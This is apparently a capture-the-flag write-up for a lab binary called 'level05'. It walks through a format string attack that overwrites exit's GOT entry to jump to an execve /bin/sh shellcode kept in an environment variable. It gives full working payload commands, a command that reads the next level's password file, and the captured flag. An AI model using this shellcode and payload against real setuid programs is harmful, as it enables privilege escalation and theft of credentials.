# level05

The executable reads 100 characters into a buffer and passes it to `printf` ; this means we can perform a format string attack.

With `exit` called at the end of `main`, we can't use `eip`, so we'll replace `exit`'s address in the GOT.

As for what we'll replace it with, there's no function to call and the `main` strips uppercase characters, so we can't use the buffer ; we'll use an `env` shellcode.

## **The exploit**

We need to figure out three things :

- The indexes of the printf buffer
- The address of our shellcode's the NOP sled, and the decimal values of that address broken down
- The target address, exit in the GOT

The first can be figured out using something like this :

```
python -c 'print("aaaa %p %p %p %p %p %p %p %p %p %p")' | ./level05
```

We find `0x61616161` at the `10th` spot ; we'll use `%10$hn` and onward.

The second can be gotten from GDB. We run and inspect :

```
env -i SHELLCODE=$(python -c 'print("\x90" * 512 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")') gdb level05
```

We find our nopesled spans from `0xffffddae` to `0xffffdfae` ; we target `0xffffdeae`.

The third can be found out in GOT. We inspect it in Cutter and find `exit` at `0x080497e0`.

We're ready to format our exploit.

## **The command**

First, we need to break down our spoofed value.

We want to write `0xffffdeae`. This is too big, so we'll break it down into `0xffff` and `0xdeae` with two `%hn`.

`0xdeae` is `57006` - but we'll have already written `8` bytes, so we'll write `56998` extra bytes before our `%10$hn` (with a `%56998d` for example).

`0xffff` is `65535` - and we'll already have written `57006` bytes, so we'll write `8529` extra bytes before our `%11$hn`.

Now we just have to format that into a buffer :

```
python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%56998d" + "%10$hn" + "%8529d" + "%11$hn")
```

## **The flag**

We string our exploit along with a command and our shellcode :

```
( python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%56998d" + "%10$hn" + "%8529d" + "%11$hn")' ; sleep .1 ; echo "cat /home/users/level06/.pass" ) | env -i SHELLCODE=$(python -c 'print("\x90" * 512 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")') ./level05
```

It works ! We get the flag for `level05` :

```
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```